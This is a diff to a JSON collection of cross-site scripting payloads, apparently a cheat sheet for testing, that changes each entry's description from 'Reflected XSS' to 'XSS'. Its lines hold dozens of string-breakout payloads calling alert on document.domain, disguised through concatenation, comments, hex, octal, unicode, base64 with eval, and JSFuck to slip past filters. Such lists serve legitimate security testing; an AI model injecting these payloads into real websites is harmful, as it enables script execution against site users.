@@ -1,6 +1,6 @@
 [
     {
-        "description": "Reflected XSS into a JavaScript string: string concatenation (window)",
+        "description": "XSS into a JavaScript string: string concatenation (window)",
         "code": "';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);\/\/",
         "browsers": [
             "chrome",
@@ -11,7 +11,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: string concatenation (self)",
+        "description": "XSS into a JavaScript string: string concatenation (self)",
         "code": "';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);\/\/",
         "browsers": [
             "chrome",
@@ -22,7 +22,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: string concatenation (this)",
+        "description": "XSS into a JavaScript string: string concatenation (this)",
         "code": "';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);\/\/",
         "browsers": [
             "chrome",
@@ -33,7 +33,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: string concatenation (top)",
+        "description": "XSS into a JavaScript string: string concatenation (top)",
         "code": "';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);\/\/",
         "browsers": [
             "chrome",
@@ -44,7 +44,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: string concatenation (parent)",
+        "description": "XSS into a JavaScript string: string concatenation (parent)",
         "code": "';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);\/\/",
         "browsers": [
             "chrome",
@@ -55,7 +55,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: string concatenation (frames)",
+        "description": "XSS into a JavaScript string: string concatenation (frames)",
         "code": "';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);\/\/",
         "browsers": [
             "chrome",
@@ -66,7 +66,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: string concatenation (globalThis)",
+        "description": "XSS into a JavaScript string: string concatenation (globalThis)",
         "code": "';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);\/\/",
         "browsers": [
             "chrome",
@@ -77,7 +77,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: comment syntax (window)",
+        "description": "XSS into a JavaScript string: comment syntax (window)",
         "code": "';window[\/*foo*\/'alert'\/*bar*\/](window[\/*foo*\/'document'\/*bar*\/]['domain']);\/\/",
         "browsers": [
             "chrome",
@@ -88,7 +88,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: comment syntax (self)",
+        "description": "XSS into a JavaScript string: comment syntax (self)",
         "code": "';self[\/*foo*\/'alert'\/*bar*\/](self[\/*foo*\/'document'\/*bar*\/]['domain']);\/\/",
         "browsers": [
             "chrome",
@@ -99,7 +99,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: comment syntax (this)",
+        "description": "XSS into a JavaScript string: comment syntax (this)",
         "code": "';this[\/*foo*\/'alert'\/*bar*\/](this[\/*foo*\/'document'\/*bar*\/]['domain']);\/\/",
         "browsers": [
             "chrome",
@@ -110,7 +110,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: comment syntax (top)",
+        "description": "XSS into a JavaScript string: comment syntax (top)",
         "code": "';top[\/*foo*\/'alert'\/*bar*\/](top[\/*foo*\/'document'\/*bar*\/]['domain']);\/\/",
         "browsers": [
             "chrome",
@@ -121,7 +121,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: comment syntax (parent)",
+        "description": "XSS into a JavaScript string: comment syntax (parent)",
         "code": "';parent[\/*foo*\/'alert'\/*bar*\/](parent[\/*foo*\/'document'\/*bar*\/]['domain']);\/\/",
         "browsers": [
             "chrome",
@@ -132,7 +132,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: comment syntax (frames)",
+        "description": "XSS into a JavaScript string: comment syntax (frames)",
         "code": "';frames[\/*foo*\/'alert'\/*bar*\/](frames[\/*foo*\/'document'\/*bar*\/]['domain']);\/\/",
         "browsers": [
             "chrome",
@@ -143,7 +143,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: comment syntax (globalThis)",
+        "description": "XSS into a JavaScript string: comment syntax (globalThis)",
         "code": "';globalThis[\/*foo*\/'alert'\/*bar*\/](globalThis[\/*foo*\/'document'\/*bar*\/]['domain']);\/\/",
         "browsers": [
             "chrome",
@@ -154,7 +154,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence (window)",
+        "description": "XSS into a JavaScript string: hex escape sequence (window)",
         "code": "';window['\\x61\\x6c\\x65\\x72\\x74'](window['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);\/\/",
         "browsers": [
             "chrome",
@@ -165,7 +165,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence (self)",
+        "description": "XSS into a JavaScript string: hex escape sequence (self)",
         "code": "';self['\\x61\\x6c\\x65\\x72\\x74'](self['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);\/\/",
         "browsers": [
             "chrome",
@@ -176,7 +176,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence (this)",
+        "description": "XSS into a JavaScript string: hex escape sequence (this)",
         "code": "';this['\\x61\\x6c\\x65\\x72\\x74'](this['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);\/\/",
         "browsers": [
             "chrome",
@@ -187,7 +187,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence (top)",
+        "description": "XSS into a JavaScript string: hex escape sequence (top)",
         "code": "';top['\\x61\\x6c\\x65\\x72\\x74'](top['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);\/\/",
         "browsers": [
             "chrome",
@@ -198,7 +198,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence (parent)",
+        "description": "XSS into a JavaScript string: hex escape sequence (parent)",
         "code": "';parent['\\x61\\x6c\\x65\\x72\\x74'](parent['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);\/\/",
         "browsers": [
             "chrome",
@@ -209,7 +209,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence (frames)",
+        "description": "XSS into a JavaScript string: hex escape sequence (frames)",
         "code": "';frames['\\x61\\x6c\\x65\\x72\\x74'](frames['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);\/\/",
         "browsers": [
             "chrome",
@@ -220,7 +220,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence (globalThis)",
+        "description": "XSS into a JavaScript string: hex escape sequence (globalThis)",
         "code": "';globalThis['\\x61\\x6c\\x65\\x72\\x74'](globalThis['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x64\\x6f\\x6d\\x61\\x69\\x6e']);\/\/",
         "browsers": [
             "chrome",
@@ -231,7 +231,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence and base64 encoded string (window)",
+        "description": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (window)",
         "code": "';window['\\x65\\x76\\x61\\x6c']('window[\"\\x61\\x6c\\x65\\x72\\x74\"](window[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');\/\/",
         "browsers": [
             "chrome",
@@ -242,7 +242,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence and base64 encoded string (self)",
+        "description": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (self)",
         "code": "';self['\\x65\\x76\\x61\\x6c']('self[\"\\x61\\x6c\\x65\\x72\\x74\"](self[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');\/\/",
         "browsers": [
             "chrome",
@@ -253,7 +253,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence and base64 encoded string (this)",
+        "description": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (this)",
         "code": "';this['\\x65\\x76\\x61\\x6c']('this[\"\\x61\\x6c\\x65\\x72\\x74\"](this[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');\/\/",
         "browsers": [
             "chrome",
@@ -264,7 +264,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence and base64 encoded string (top)",
+        "description": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (top)",
         "code": "';top['\\x65\\x76\\x61\\x6c']('top[\"\\x61\\x6c\\x65\\x72\\x74\"](top[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');\/\/",
         "browsers": [
             "chrome",
@@ -275,7 +275,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence and base64 encoded string (parent)",
+        "description": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (parent)",
         "code": "';parent['\\x65\\x76\\x61\\x6c']('parent[\"\\x61\\x6c\\x65\\x72\\x74\"](parent[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');\/\/",
         "browsers": [
             "chrome",
@@ -286,7 +286,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence and base64 encoded string (frames)",
+        "description": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (frames)",
         "code": "';frames['\\x65\\x76\\x61\\x6c']('frames[\"\\x61\\x6c\\x65\\x72\\x74\"](frames[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');\/\/",
         "browsers": [
             "chrome",
@@ -297,7 +297,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: hex escape sequence and base64 encoded string (globalThis)",
+        "description": "XSS into a JavaScript string: hex escape sequence and base64 encoded string (globalThis)",
         "code": "';globalThis['\\x65\\x76\\x61\\x6c']('globalThis[\"\\x61\\x6c\\x65\\x72\\x74\"](globalThis[\"\\x61\\x74\\x6f\\x62\"](\"WFNT\"))');\/\/",
         "browsers": [
             "chrome",
@@ -308,7 +308,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: octal escape sequence (window)",
+        "description": "XSS into a JavaScript string: octal escape sequence (window)",
         "code": "';window['\\141\\154\\145\\162\\164']('\\130\\123\\123');\/\/",
         "browsers": [
             "chrome",
@@ -319,7 +319,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: octal escape sequence (self)",
+        "description": "XSS into a JavaScript string: octal escape sequence (self)",
         "code": "';self['\\141\\154\\145\\162\\164']('\\130\\123\\123');\/\/",
         "browsers": [
             "chrome",
@@ -330,7 +330,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: octal escape sequence (this)",
+        "description": "XSS into a JavaScript string: octal escape sequence (this)",
         "code": "';this['\\141\\154\\145\\162\\164']('\\130\\123\\123');\/\/",
         "browsers": [
             "chrome",
@@ -341,7 +341,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: octal escape sequence (top)",
+        "description": "XSS into a JavaScript string: octal escape sequence (top)",
         "code": "';top['\\141\\154\\145\\162\\164']('\\130\\123\\123');\/\/",
         "browsers": [
             "chrome",
@@ -352,7 +352,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: octal escape sequence (parent)",
+        "description": "XSS into a JavaScript string: octal escape sequence (parent)",
         "code": "';parent['\\141\\154\\145\\162\\164']('\\130\\123\\123');\/\/",
         "browsers": [
             "chrome",
@@ -363,7 +363,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: octal escape sequence (frames)",
+        "description": "XSS into a JavaScript string: octal escape sequence (frames)",
         "code": "';frames['\\141\\154\\145\\162\\164']('\\130\\123\\123');\/\/",
         "browsers": [
             "chrome",
@@ -374,7 +374,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: octal escape sequence (globalThis)",
+        "description": "XSS into a JavaScript string: octal escape sequence (globalThis)",
         "code": "';globalThis['\\141\\154\\145\\162\\164']('\\130\\123\\123');\/\/",
         "browsers": [
             "chrome",
@@ -385,7 +385,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: unicode escape (window)",
+        "description": "XSS into a JavaScript string: unicode escape (window)",
         "code": "';window['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');\/\/",
         "browsers": [
             "chrome",
@@ -396,7 +396,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: unicode escape (self)",
+        "description": "XSS into a JavaScript string: unicode escape (self)",
         "code": "';self['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');\/\/",
         "browsers": [
             "chrome",
@@ -407,7 +407,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: unicode escape (this)",
+        "description": "XSS into a JavaScript string: unicode escape (this)",
         "code": "';this['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');\/\/",
         "browsers": [
             "chrome",
@@ -418,7 +418,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: unicode escape (top)",
+        "description": "XSS into a JavaScript string: unicode escape (top)",
         "code": "';top['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');\/\/",
         "browsers": [
             "chrome",
@@ -429,7 +429,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: unicode escape (parent)",
+        "description": "XSS into a JavaScript string: unicode escape (parent)",
         "code": "';parent['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');\/\/",
         "browsers": [
             "chrome",
@@ -440,7 +440,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: unicode escape (frames)",
+        "description": "XSS into a JavaScript string: unicode escape (frames)",
         "code": "';frames['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');\/\/",
         "browsers": [
             "chrome",
@@ -451,7 +451,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: unicode escape (globalThis)",
+        "description": "XSS into a JavaScript string: unicode escape (globalThis)",
         "code": "';globalThis['\\u{0061}\\u{006c}\\u{0065}\\u{0072}\\u{0074}']('\\u{0058}\\u{0053}\\u{0053}');\/\/",
         "browsers": [
             "chrome",
@@ -462,7 +462,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: RegExp source property (window)",
+        "description": "XSS into a JavaScript string: RegExp source property (window)",
         "code": "';window[\/al\/.source+\/ert\/.source](\/XSS\/.source);\/\/",
         "browsers": [
             "chrome",
@@ -473,7 +473,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: RegExp source property (self)",
+        "description": "XSS into a JavaScript string: RegExp source property (self)",
         "code": "';self[\/al\/.source+\/ert\/.source](\/XSS\/.source);\/\/",
         "browsers": [
             "chrome",
@@ -484,7 +484,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: RegExp source property (this)",
+        "description": "XSS into a JavaScript string: RegExp source property (this)",
         "code": "';this[\/al\/.source+\/ert\/.source](\/XSS\/.source);\/\/",
         "browsers": [
             "chrome",
@@ -495,7 +495,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: RegExp source property (top)",
+        "description": "XSS into a JavaScript string: RegExp source property (top)",
         "code": "';top[\/al\/.source+\/ert\/.source](\/XSS\/.source);\/\/",
         "browsers": [
             "chrome",
@@ -506,7 +506,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: RegExp source property (parent)",
+        "description": "XSS into a JavaScript string: RegExp source property (parent)",
         "code": "';parent[\/al\/.source+\/ert\/.source](\/XSS\/.source);\/\/",
         "browsers": [
             "chrome",
@@ -517,7 +517,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: RegExp source property (frames)",
+        "description": "XSS into a JavaScript string: RegExp source property (frames)",
         "code": "';frames[\/al\/.source+\/ert\/.source](\/XSS\/.source);\/\/",
         "browsers": [
             "chrome",
@@ -528,7 +528,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: RegExp source property (globalThis)",
+        "description": "XSS into a JavaScript string: RegExp source property (globalThis)",
         "code": "';globalThis[\/al\/.source+\/ert\/.source](\/XSS\/.source);\/\/",
         "browsers": [
             "chrome",
@@ -539,7 +539,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (window)",
+        "description": "XSS into a JavaScript string: Hieroglyphy\/JSFuck (window)",
         "code": "';window[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
         "browsers": [
             "chrome",
@@ -550,7 +550,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (self)",
+        "description": "XSS into a JavaScript string: Hieroglyphy\/JSFuck (self)",
         "code": "';self[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
         "browsers": [
             "chrome",
@@ -561,7 +561,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (this)",
+        "description": "XSS into a JavaScript string: Hieroglyphy\/JSFuck (this)",
         "code": "';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
         "browsers": [
             "chrome",
@@ -572,7 +572,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (top)",
+        "description": "XSS into a JavaScript string: Hieroglyphy\/JSFuck (top)",
         "code": "';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
         "browsers": [
             "chrome",
@@ -583,7 +583,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (parent)",
+        "description": "XSS into a JavaScript string: Hieroglyphy\/JSFuck (parent)",
         "code": "';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
         "browsers": [
             "chrome",
@@ -594,7 +594,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (frames)",
+        "description": "XSS into a JavaScript string: Hieroglyphy\/JSFuck (frames)",
         "code": "';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
         "browsers": [
             "chrome",
@@ -605,7 +605,7 @@
         "context": "js_string_single"
     },
     {
-        "description": "Reflected XSS into a JavaScript string: Hieroglyphy\/JSFuck (globalThis)",
+        "description": "XSS into a JavaScript string: Hieroglyphy\/JSFuck (globalThis)",
         "code": "';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);\/\/",
         "browsers": [
             "chrome",
